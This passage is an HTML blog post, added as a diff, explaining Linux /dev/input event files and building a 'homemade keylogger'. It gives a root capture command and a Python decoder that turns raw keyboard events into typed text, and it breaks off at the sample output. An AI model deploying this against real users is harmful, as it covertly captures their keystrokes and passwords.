@@ -1,0 +1,229 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>GNU/Linux Homemade Keylogger - ~# SpyF0x_</title><meta name=Description content="I'm going to list three methods from the most stealthy and less effective to the less stealthy and most effective to gather an email address using GitHub."><meta property="og:title" content="GNU/Linux Homemade Keylogger"><meta property="og:description" content="I'm going to list three methods from the most stealthy and less effective to the less stealthy and most effective to gather an email address using GitHub."><meta property="og:type" content="article"><meta property="og:url" content="https://spyfox.me/posts/cybersecurity/offensive/system/gnu-linux-homemade-keylogger/"><meta property="og:image" content="https://spyfox.me/logo.png"><meta property="article:published_time" content="2022-04-16T12:00:00+00:00"><meta property="article:modified_time" content="2022-04-16T12:00:00+00:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://spyfox.me/logo.png"><meta name=twitter:title content="GNU/Linux Homemade Keylogger"><meta name=twitter:description content="I'm going to list three methods from the most stealthy and less effective to the less stealthy and most effective to gather an email address using GitHub."><meta name=application-name content="~# SpyF0x_"><meta name=apple-mobile-web-app-title content="~# SpyF0x_"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://spyfox.me/posts/cybersecurity/offensive/system/gnu-linux-homemade-keylogger/><link rel=prev href=https://spyfox.me/posts/cybersecurity/offensive/red-team/osint/hide-your-email-address-on-github/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"GNU/Linux Homemade Keylogger","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/spyfox.me\/posts\/cybersecurity\/offensive\/system\/gnu-linux-homemade-keylogger\/"},"image":["https:\/\/spyfox.me\/images\/Apple-Devices-Preview.png"],"genre":"posts","keywords":"linux, system, keylogger, diy","wordcount":1197,"url":"https:\/\/spyfox.me\/posts\/cybersecurity\/offensive\/system\/gnu-linux-homemade-keylogger\/","datePublished":"2022-04-16T12:00:00+00:00","dateModified":"2022-04-16T12:00:00+00:00","publisher":{"@type":"Organization","name":"SpyF0x","logo":"https:\/\/spyfox.me\/images\/avatar.png"},"author":{"@type":"Person","name":" SpyF0x "},"description":"I'm going to list three methods from the most stealthy and less effective to the less stealthy and most effective to gather an email address using GitHub."}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'auto'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'auto'==='dark')&&document.body.setAttribute('theme','dark')</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="~# SpyF0x_"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/images/avatar.png data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x" data-sizes=auto alt=/images/avatar.png title=/images/avatar.png>~# SpyF0x_</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/posts/about>About </a><a class=menu-item href=/index.xml><i class="fas fa-rss fa-fw"></i> </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw"></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw"></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="~# SpyF0x_"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/images/avatar.png data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x" data-sizes=auto alt=/images/avatar.png title=/images/avatar.png>~# SpyF0x_</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw"></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw"></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/posts/about title>About</a><a class=menu-item href=/index.xml title><i class="fas fa-rss fa-fw"></i></a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">GNU/Linux Homemade Keylogger</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=" author" class=author><i class="fas fa-user-circle fa-fw"></i> SpyF0x </a></span>&nbsp;<span class=post-category>included in <a href=/categories/offensive-security/><i class="far fa-folder fa-fw"></i>Offensive Security</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2022-04-16>2022-04-16</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1197 words&nbsp;
+<i class="far fa-clock fa-fw"></i>&nbsp;6 minutes&nbsp;</div></div><div class=featured-image><img class=lazyload src=/svg/loading.min.svg data-src=/images/security/linux-keylogger/linux-keylogger.webp data-srcset="/images/security/linux-keylogger/linux-keylogger.webp, /images/security/linux-keylogger/linux-keylogger.webp 1.5x, /images/security/linux-keylogger/linux-keylogger.webp 2x" data-sizes=auto alt=/images/security/linux-keylogger/linux-keylogger.webp title="I'm going to list three methods from the most stealthy and less effective to the less stealthy and most effective to gather an email address using GitHub."></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>Contents</span>
+<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#a-bit-of-context>A bit of context</a></li><li><a href=#whats-inside->What&rsquo;s inside ?</a><ul><li><a href=#input-device-bus-mapping>Input device bus mapping</a></li><li><a href=#input-device-mapping>Input device mapping</a></li></ul></li><li><a href=#reading-the-data-stream>Reading the data stream</a></li><li><a href=#interpreting-the-input-stream>Interpreting the input stream</a></li><li><a href=#example--homemade-keylogger>Example : Homemade keylogger</a><ul><li><a href=#get-access-to-devinput>Get access to <code>/dev/input/</code></a></li><li><a href=#logging>Logging</a></li><li><a href=#decoding>Decoding</a></li><li><a href=#alternative-way--replay-attack>Alternative way : Replay Attack</a></li></ul></li><li><a href=#because-im-not-a-rocket-scientist-the-references>Because I&rsquo;m not a rocket scientist, the references</a></li><li><a href=#make-a-good-action->Make a good action !</a></li></ul></nav></div></div><div class=content id=content><h2 id=a-bit-of-context>A bit of context</h2><hr><p>GNU/Linux is one of those operating systems where, once you get the hang of it, you can&rsquo;t stop wanting to learn more about how it works.</p><p>In this article, we will explore how the /dev/input directory works and what can be done with it.</p><h2 id=whats-inside->What&rsquo;s inside ?</h2><hr><p>Let&rsquo;s simply begin with a simple <code>ls</code> on it :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash>$ ls /dev/input/
+by-id    event1   event12  event15  event18  event20  event23  event3  event6  event9  mouse1
+by-path  event10  event13  event16  event19  event21  event24  event4  event7  mice    mouse2
+event0   event11  event14  event17  event2   event22  event25  event5  event8  mouse0
+</code></pre></td></tr></table></div></div><p>You&rsquo;ll notice that the output can be broken down into :</p><ul><li>by-id, by-path</li><li>event(n)</li><li>mice, mouse(n)</li></ul><p>But with so many files, how do you know which one corresponds to what ? Hopefully, there are two ways to find out :</p><h3 id=input-device-bus-mapping>Input device bus mapping</h3><p>The below command displays relevant information about the input devices connected to your system :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash>$ cat /proc/bus/input/devices
+
+I: <span class=nv>Bus</span><span class=o>=</span><span class=m>0003</span> <span class=nv>Vendor</span><span class=o>=</span>192f <span class=nv>Product</span><span class=o>=</span><span class=m>0916</span> <span class=nv>Version</span><span class=o>=</span><span class=m>0111</span>
+N: <span class=nv>Name</span><span class=o>=</span><span class=s2>&#34;USB Optical Mouse&#34;</span>
+P: <span class=nv>Phys</span><span class=o>=</span>usb-0000:00:1d.0-1.4/input0
+S: <span class=nv>Sysfs</span><span class=o>=</span>/devices/pci0000:00/0000:00:1d.0/usb2/2-1/2-1.4/2-1.4:1.0/input/input0
+U: <span class=nv>Uniq</span><span class=o>=</span>
+H: <span class=nv>Handlers</span><span class=o>=</span>mouse0 event0 
+B: <span class=nv>PROP</span><span class=o>=</span><span class=m>0</span>
+B: <span class=nv>EV</span><span class=o>=</span><span class=m>17</span>
+B: <span class=nv>KEY</span><span class=o>=</span><span class=m>70000</span> <span class=m>0</span> <span class=m>0</span> <span class=m>0</span> <span class=m>0</span>
+B: <span class=nv>REL</span><span class=o>=</span><span class=m>103</span>
+B: <span class=nv>MSC</span><span class=o>=</span><span class=m>10</span>
+ 
+I: <span class=nv>Bus</span><span class=o>=</span><span class=m>0003</span> <span class=nv>Vendor</span><span class=o>=</span>05ac <span class=nv>Product</span><span class=o>=</span><span class=m>0250</span> <span class=nv>Version</span><span class=o>=</span><span class=m>0111</span>
+N: <span class=nv>Name</span><span class=o>=</span><span class=s2>&#34;Apple Inc. Apple Keyboard&#34;</span>
+P: <span class=nv>Phys</span><span class=o>=</span>usb-0000:00:1d.0-1.3.4.2/input0
+S: <span class=nv>Sysfs</span><span class=o>=</span>/devices/pci0000:00/0000:00:1d.0/usb2/2-1/2-1.3/2-1.3.4/2-1.3.4.2/2-1.3.4.2:1.0/input/input1
+U: <span class=nv>Uniq</span><span class=o>=</span>
+H: <span class=nv>Handlers</span><span class=o>=</span>sysrq kbd event1 
+B: <span class=nv>PROP</span><span class=o>=</span><span class=m>0</span>
+B: <span class=nv>EV</span><span class=o>=</span><span class=m>120013</span>
+B: <span class=nv>KEY</span><span class=o>=</span><span class=m>10000</span> <span class=m>0</span> <span class=m>0</span> <span class=m>0</span> 1007b00001007 ff9f207ac14057ff ffbeffdfffefffff fffffffffffffffe
+B: <span class=nv>MSC</span><span class=o>=</span><span class=m>10</span>
+B: <span class=nv>LED</span><span class=o>=</span>1f
+
+...
+</code></pre></td></tr></table></div></div><p>The key information here is the event handler of our device. For example, for the USB optical mouse, <code>H: Handlers</code> is <code>event0</code> whereas it&rsquo;s <code>event1</code> for the keyboard.</p><p>With this, we can match all the event files with the corresponding device.</p><h3 id=input-device-mapping>Input device mapping</h3><p>Another approach is to look at <code>/dev/input/by-id</code> or <code>/dev/input/by-path</code>, they have symbolic links to <code>/dev/input/event</code>. The only downside of this method is that it does not display all possible devices.</p><h2 id=reading-the-data-stream>Reading the data stream</h2><p>If you want to read an event file, simply do a <code>cat</code> on it, and you will get an output similar to this :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash>$ cat /dev/input/event1
+
+DV<span class=se>\b</span>�<span class=o>(</span>DV<span class=se>\b</span>�DV<span class=se>\b</span>�EV<span class=se>\b</span>�	EV<span class=se>\b</span>�	EV<span class=se>\b</span>�	sEV<span class=se>\b</span>�Q
+EV<span class=se>\b</span>�Q
+EV<span class=se>\b</span>�Q
+GV<span class=se>\b</span>�
+     GV<span class=se>\b</span>�
+          GV<span class=se>\b</span>�
+JV<span class=se>\b</span>h�JV<span class=se>\b</span>hJV<span class=se>\b</span>hKV<span class=se>\b</span>�	@
+                     KV<span class=se>\b</span>�
+                          .KV<span class=se>\b</span>�
+                                ^C
+</code></pre></td></tr></table></div></div><p>Here, I chose to look at the data stream coming from my keyboard. When I typed a few characters, the binary stream appeared in my terminal, leaving this cryptic output. <strong><em>Let&rsquo;s decode it !</em></strong></p><h2 id=interpreting-the-input-stream>Interpreting the input stream</h2><hr><p>The format for the input stream is given in the official GNU/Linux documentation as follows :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=k>struct</span> <span class=n>input_event</span> <span class=p>{</span>
+	<span class=k>struct</span> <span class=n>timeval</span> <span class=n>time</span><span class=p>;</span>
+	<span class=kt>unsigned</span> <span class=kt>short</span> <span class=n>type</span><span class=p>;</span>
+	<span class=kt>unsigned</span> <span class=kt>short</span> <span class=n>code</span><span class=p>;</span>
+	<span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>value</span><span class=p>;</span>
+<span class=p>};</span>
+</code></pre></td></tr></table></div></div><p>This output format is the same for all event files.</p><h2 id=example--homemade-keylogger>Example : Homemade keylogger</h2><hr><p>Anyone accessing <code>/dev/input/*</code> could easily record all your keystrokes. This can quickly become a major vulnerability, as anyone could track your activity on your computer and easily retrieve all your passwords. A program that can do this remotely / automatically is called a <a href=https://wikipedia.org/wiki/Keylogger target=_blank rel="noopener noreffer">keylogger</a>.</p><h3 id=get-access-to-devinput>Get access to <code>/dev/input/</code></h3><p>Since the directory is protected by default from unprivileged users, an alternative to reading event devices directly would be to use an appropriate user space API instead.</p><p>For example, to read the keyboard, one would use ncurses, while GPM would be used to read the mouse input.</p><h3 id=logging>Logging</h3><p>Let&rsquo;s imagine that the keyboard input stream is managed by the <code>event0</code> file. We could develop a simple keylogger as follows :</p><p><code>$ sudo cat /dev/input/event0 > /tmp/keylogger.raw</code></p><h3 id=decoding>Decoding</h3><p>Using the format of the input stream and knowing the target user keymapping we can use this python script to properly decode the input data stream :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/python3</span>
+<span class=kn>import</span> <span class=nn>struct</span>
+
+<span class=c1># Mapping FR, change it accordingly to target keymap (DK, DE, US, etc.)</span>
+
+<span class=n>mapping</span> <span class=o>=</span> <span class=p>{</span><span class=mi>16</span><span class=p>:</span><span class=s1>&#39;a&#39;</span><span class=p>,</span> <span class=mi>17</span><span class=p>:</span><span class=s1>&#39;z&#39;</span><span class=p>,</span> <span class=mi>18</span><span class=p>:</span><span class=s1>&#39;e&#39;</span><span class=p>,</span> <span class=mi>19</span><span class=p>:</span><span class=s1>&#39;r&#39;</span><span class=p>,</span> <span class=mi>20</span><span class=p>:</span><span class=s1>&#39;t&#39;</span><span class=p>,</span> <span class=mi>21</span><span class=p>:</span><span class=s1>&#39;y&#39;</span><span class=p>,</span> <span class=mi>22</span><span class=p>:</span><span class=s1>&#39;u&#39;</span><span class=p>,</span> <span class=mi>23</span><span class=p>:</span><span class=s1>&#39;i&#39;</span><span class=p>,</span> <span class=mi>24</span><span class=p>:</span><span class=s1>&#39;o&#39;</span><span class=p>,</span> <span class=mi>25</span><span class=p>:</span><span class=s1>&#39;p&#39;</span><span class=p>,</span> <span class=mi>30</span><span class=p>:</span><span class=s1>&#39;q&#39;</span><span class=p>,</span> <span class=mi>31</span><span class=p>:</span><span class=s1>&#39;s&#39;</span><span class=p>,</span> <span class=mi>32</span><span class=p>:</span><span class=s1>&#39;d&#39;</span><span class=p>,</span>
+        <span class=mi>33</span><span class=p>:</span><span class=s1>&#39;f&#39;</span><span class=p>,</span> <span class=mi>34</span><span class=p>:</span><span class=s1>&#39;g&#39;</span><span class=p>,</span> <span class=mi>35</span><span class=p>:</span><span class=s1>&#39;h&#39;</span><span class=p>,</span> <span class=mi>36</span><span class=p>:</span><span class=s1>&#39;j&#39;</span><span class=p>,</span> <span class=mi>37</span><span class=p>:</span><span class=s1>&#39;k&#39;</span><span class=p>,</span> <span class=mi>38</span><span class=p>:</span><span class=s1>&#39;l&#39;</span><span class=p>,</span> <span class=mi>39</span><span class=p>:</span><span class=s1>&#39;m&#39;</span><span class=p>,</span> <span class=mi>44</span><span class=p>:</span><span class=s1>&#39;w&#39;</span><span class=p>,</span> <span class=mi>45</span><span class=p>:</span><span class=s1>&#39;x&#39;</span><span class=p>,</span> <span class=mi>46</span><span class=p>:</span><span class=s1>&#39;c&#39;</span><span class=p>,</span> <span class=mi>47</span><span class=p>:</span><span class=s1>&#39;v&#39;</span><span class=p>,</span> <span class=mi>48</span><span class=p>:</span><span class=s1>&#39;b&#39;</span><span class=p>,</span> <span class=mi>49</span><span class=p>:</span><span class=s1>&#39;n&#39;</span><span class=p>,</span>
+        <span class=mi>2</span><span class=p>:</span><span class=s1>&#39;&amp;&#39;</span><span class=p>,</span> <span class=mi>3</span><span class=p>:</span><span class=s1>&#39;é&#39;</span><span class=p>,</span> <span class=mi>4</span><span class=p>:</span><span class=s1>&#39;&#34;&#39;</span><span class=p>,</span> <span class=mi>5</span><span class=p>:</span><span class=s1>&#39;</span><span class=se>\&#39;</span><span class=s1>&#39;</span><span class=p>,</span> <span class=mi>6</span><span class=p>:</span><span class=s1>&#39;(&#39;</span><span class=p>,</span> <span class=mi>7</span><span class=p>:</span><span class=s1>&#39;-&#39;</span><span class=p>,</span> <span class=mi>8</span><span class=p>:</span><span class=s1>&#39;è&#39;</span><span class=p>,</span> <span class=mi>9</span><span class=p>:</span><span class=s1>&#39;_&#39;</span><span class=p>,</span> <span class=mi>10</span><span class=p>:</span><span class=s1>&#39;ç&#39;</span><span class=p>,</span> <span class=mi>11</span><span class=p>:</span><span class=s1>&#39;à&#39;</span><span class=p>,</span> <span class=mi>12</span><span class=p>:</span><span class=s1>&#39;)&#39;</span><span class=p>,</span> <span class=mi>13</span><span class=p>:</span><span class=s1>&#39;=&#39;</span><span class=p>,</span> <span class=mi>27</span><span class=p>:</span><span class=s1>&#39;$&#39;</span><span class=p>,</span> <span class=mi>40</span><span class=p>:</span><span class=s1>&#39;ù&#39;</span><span class=p>,</span>
+        <span class=mi>43</span><span class=p>:</span><span class=s1>&#39;*&#39;</span><span class=p>,</span> <span class=mi>50</span><span class=p>:</span><span class=s1>&#39;,&#39;</span><span class=p>,</span> <span class=mi>51</span><span class=p>:</span><span class=s1>&#39;;&#39;</span><span class=p>,</span> <span class=mi>52</span><span class=p>:</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=mi>53</span><span class=p>:</span><span class=s1>&#39;!&#39;</span><span class=p>,</span> <span class=mi>35</span><span class=p>:</span><span class=s1>&#39;h&#39;</span><span class=p>,</span> <span class=mi>28</span><span class=p>:</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=mi>42</span><span class=p>:</span><span class=s1>&#39;&lt;SHIFT&gt;&#39;</span><span class=p>,</span> <span class=mi>54</span><span class=p>:</span><span class=s1>&#39;&lt;SHIFT&gt;&#39;</span><span class=p>,</span> <span class=mi>29</span><span class=p>:</span><span class=s1>&#39;&lt;CTRL&gt;&#39;</span><span class=p>,</span>
+        <span class=mi>56</span><span class=p>:</span><span class=s1>&#39;&lt;ALT&gt;&#39;</span><span class=p>,</span> <span class=mi>100</span><span class=p>:</span><span class=s1>&#39;&lt;AltGr&gt;&#39;</span><span class=p>,</span> <span class=mi>97</span><span class=p>:</span><span class=s1>&#39;&lt;CTRL&gt;&#39;</span><span class=p>,</span> <span class=mi>82</span><span class=p>:</span><span class=s1>&#39;0&#39;</span><span class=p>,</span> <span class=mi>79</span><span class=p>:</span><span class=s1>&#39;1&#39;</span><span class=p>,</span> <span class=mi>80</span><span class=p>:</span><span class=s1>&#39;2&#39;</span><span class=p>,</span> <span class=mi>81</span><span class=p>:</span><span class=s1>&#39;3&#39;</span><span class=p>,</span> <span class=mi>75</span><span class=p>:</span><span class=s1>&#39;4&#39;</span><span class=p>,</span> <span class=mi>76</span><span class=p>:</span><span class=s1>&#39;5&#39;</span><span class=p>,</span> <span class=mi>77</span><span class=p>:</span><span class=s1>&#39;6&#39;</span><span class=p>,</span> <span class=mi>71</span><span class=p>:</span><span class=s1>&#39;7&#39;</span><span class=p>,</span>
+        <span class=mi>72</span><span class=p>:</span><span class=s1>&#39;8&#39;</span><span class=p>,</span> <span class=mi>73</span><span class=p>:</span><span class=s1>&#39;9&#39;</span><span class=p>,</span> <span class=mi>57</span><span class=p>:</span><span class=s1>&#39; &#39;</span><span class=p>,</span> <span class=mi>86</span><span class=p>:</span><span class=s1>&#39;&lt;&#39;</span><span class=p>,</span> <span class=mi>14</span><span class=p>:</span><span class=s1>&#39;&lt;BACKSPACE&gt;&#39;</span><span class=p>,</span> <span class=mi>15</span><span class=p>:</span><span class=s1>&#39;    &#39;</span><span class=p>,</span> <span class=mi>59</span><span class=p>:</span><span class=s1>&#39;&lt;F1&gt;&#39;</span><span class=p>,</span> <span class=mi>60</span><span class=p>:</span><span class=s1>&#39;&lt;F2&gt;&#39;</span><span class=p>,</span> <span class=mi>61</span><span class=p>:</span><span class=s1>&#39;&lt;F3&gt;&#39;</span><span class=p>,</span> <span class=mi>62</span><span class=p>:</span><span class=s1>&#39;&lt;F4&gt;&#39;</span><span class=p>,</span>
+        <span class=mi>63</span><span class=p>:</span><span class=s1>&#39;&lt;F5&gt;&#39;</span><span class=p>,</span> <span class=mi>64</span><span class=p>:</span><span class=s1>&#39;&lt;F6&gt;&#39;</span><span class=p>,</span> <span class=mi>65</span><span class=p>:</span><span class=s1>&#39;&lt;F7&gt;&#39;</span><span class=p>,</span> <span class=mi>66</span><span class=p>:</span><span class=s1>&#39;&lt;F8&gt;&#39;</span><span class=p>,</span> <span class=mi>67</span><span class=p>:</span><span class=s1>&#39;&lt;F9&gt;&#39;</span><span class=p>,</span> <span class=mi>74</span><span class=p>:</span><span class=s1>&#39;-&#39;</span><span class=p>,</span> <span class=mi>83</span><span class=p>:</span><span class=s1>&#39;.&#39;</span><span class=p>,</span> <span class=mi>96</span><span class=p>:</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&lt;ENTER&gt;&#39;</span><span class=p>,</span> <span class=mi>26</span><span class=p>:</span><span class=s1>&#39;^&#39;</span><span class=p>,</span> <span class=mi>1</span><span class=p>:</span><span class=s1>&#39;&lt;ESC&gt;&#39;</span><span class=p>,</span>
+        <span class=mi>78</span><span class=p>:</span><span class=s1>&#39;+&#39;</span><span class=p>,</span> <span class=mi>103</span><span class=p>:</span><span class=s1>&#39;&lt;UP&gt;&#39;</span><span class=p>}</span>
+
+<span class=s2>&#34;&#34;&#34;
+</span><span class=s2>FORMAT represents the format used by linux kernel input event struct
+</span><span class=s2>See https://github.com/torvalds/linux/blob/v5.5-rc5/include/uapi/linux/input.h#L28
+</span><span class=s2>Stands for: long int, long int, unsigned short, unsigned short, unsigned int
+</span><span class=s2>&#34;&#34;&#34;</span>
+
+<span class=n>FORMAT</span> <span class=o>=</span> <span class=s1>&#39;llHHI&#39;</span>
+<span class=n>EVENT_SIZE</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>calcsize</span><span class=p>(</span><span class=n>FORMAT</span><span class=p>)</span>
+
+<span class=k>print</span><span class=p>(</span><span class=s2>&#34;============== RAW ===============&#34;</span><span class=p>)</span>
+<span class=n>output</span> <span class=o>=</span> <span class=p>[]</span>
+<span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;/tmp/keylogger.raw&#34;</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
+    <span class=n>event</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=n>EVENT_SIZE</span><span class=p>)</span>
+    <span class=k>while</span> <span class=n>event</span><span class=p>:</span>
+        <span class=p>(</span><span class=n>tv_sec</span><span class=p>,</span> <span class=n>tv_usec</span><span class=p>,</span> <span class=nb>type</span><span class=p>,</span> <span class=n>code</span><span class=p>,</span> <span class=n>value</span><span class=p>)</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=n>FORMAT</span><span class=p>,</span> <span class=n>event</span><span class=p>)</span>
+        <span class=n>k</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+        <span class=k>if</span> <span class=nb>type</span> <span class=o>==</span> <span class=mi>1</span> <span class=ow>and</span> <span class=n>value</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
+            <span class=n>output</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>mapping</span><span class=p>[</span><span class=n>code</span><span class=p>])</span>
+            <span class=n>k</span> <span class=o>=</span> <span class=n>mapping</span><span class=p>[</span><span class=n>code</span><span class=p>]</span>
+        <span class=k>print</span> <span class=p>(</span><span class=s2>&#34;</span><span class=si>%s</span><span class=se>\t</span><span class=si>%s</span><span class=se>\t</span><span class=si>%s</span><span class=se>\t</span><span class=si>%s</span><span class=se>\t</span><span class=si>%s</span><span class=se>\t</span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>tv_sec</span><span class=p>,</span> <span class=n>tv_usec</span><span class=p>,</span> <span class=nb>type</span><span class=p>,</span> <span class=n>code</span><span class=p>,</span> <span class=n>value</span><span class=p>,</span> <span class=n>k</span><span class=p>))</span>
+
+        <span class=n>event</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=n>EVENT_SIZE</span><span class=p>)</span>
+
+<span class=k>print</span><span class=p>(</span><span class=s2>&#34;=============== DECODED ==============&#34;</span><span class=p>)</span>
+<span class=n>out</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>output</span><span class=p>)</span>
+<span class=k>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
+</code></pre></td></tr></table></div></div><p>Here&rsquo;s a sample output :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
